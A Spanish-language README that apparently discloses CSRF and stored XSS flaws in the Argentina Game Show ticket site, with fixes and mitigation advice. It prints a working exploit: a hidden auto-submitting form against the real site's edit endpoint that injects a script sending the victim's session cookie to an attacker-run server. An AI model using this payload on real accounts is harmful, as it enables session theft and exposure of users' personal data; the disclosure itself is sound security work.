# AGS-CSRF-XSS POC

La pagina de la AGS es vulnerable a CSRF y XSS, haciendo que un atacante pueda conseguir acceso total a la cuenta de alguien convenciendolo de que abra un link malicioso. La info que puede conseguir es la siguiente: nombre completo, email, fecha de nacimiento, dni, entradas al evento y hash MD5 de la contraseña que se puede llegar a crackear.

Intenté reportarles el problema pero decidieron ignorarlo porque su "entendimiento básico de cyberseguridad es no abrir links randoms". Lo que es verdad pero no suficiente, es irrespondable de la parte de ellos dejar a sus usuarios expuestos, en mi opinion.

## Tabla de contenidos
- [Tabla de contenidos](#tabla-de-contenidos)
- [Vulnerabilidad](#vulnerabilidad)
- [Fix](#fix)
- [Mitigacion](#mitigacion)
- [POC](#poc)

## Vulnerabilidad
El form para cambiar la información del usuario (/mis-datos) no tiene protección contra CSRF, la cookie PHPSSESSID tiene el flag `SameSite` en `None` por lo que se agrega automaticamente al hacer el submit sin hacer ningun chequeo del origen.

Uno puede desde otra pagina web, hacer un form con los datos que quiere cambiar y hacer que se envíe solo, el usuario no se dará cuenta que está cambiando su información. Al hacer el cambio, el usuario es redirigido a una pagina donde se muestran los nuevos datos.

El servidor no sanitiza correctamente los datos que se le envian, y la forma en la los muestra es vulnerable a XSS, se puede inyectar codigo en cualquiera de los campos. (filtra algunos caracteres pero no de forma correcta)

Este es el codigo que se puede usar para explotarlo:

```html
<body>
    <form name="myForm" id="myForm" method="POST" style="display: none;" action="https://app.argentinagameshow.com/ajax/table_edit.php?notab=1&tid=22&ftid=&rid=&sdb=0&id=&tab=undefined">
        <!-- redirige a nuestro servidor con las cookies en la url -->
        <input type="text" name="22_98" value="<img src='' onerror=window.location.href=`http://localhost:8888/info?${document.cookie}`>">
        <input type="text" name="action" value="edit">
        <input type="submit" value="Submit">
    </form>

    <script>
        document.getElementById("myForm").submit();
    </script>
</body>
```

## Fix
Hay dos formas de solucionar este problema, la primera es agregar un token CSRF al form que esté linkeado con la sesion o el usuario, y verificar que el token sea correcto del lado del servidor antes de hacer el cambio. 

La segunda es agregar el flag `SameSite` a la cookie PHPSSESSID, y ponerlo en `Lax` o `Strict`, esto hará que el navegador no envie la cookie al servidor si el origen no es el mismo que el del servidor.

Este post de [Porswigger](https://portswigger.net/web-security/csrf/preventing) explica mas en detalle como solucionar problemas relaciondos a CSRF, que ventajas y desventajas tiene cada una de las soluciones.

## Mitigación
Mientras los de AGS no arreglen este problema, forma de mitigar este problema que tenemos por ahora es cerrar sesion en la pagina de la AGS y usar unicamente la APP de telefono. La app corre en un navegador propio y los demas navegadores no tienen acceso a sus cookies. **Y no hacer click en links que no sean de confianza.**

## POC
Este repo tiene incluido un POC, para correrlo tienen que tener instalado node y typescript. instalan las dependencias con `npm i` y lo ejecutan con `npm run dev`. Cuando entren a `http://localhost:8888` se va a redirigir un par de veces y les va a mostrar la info de su cuenta.
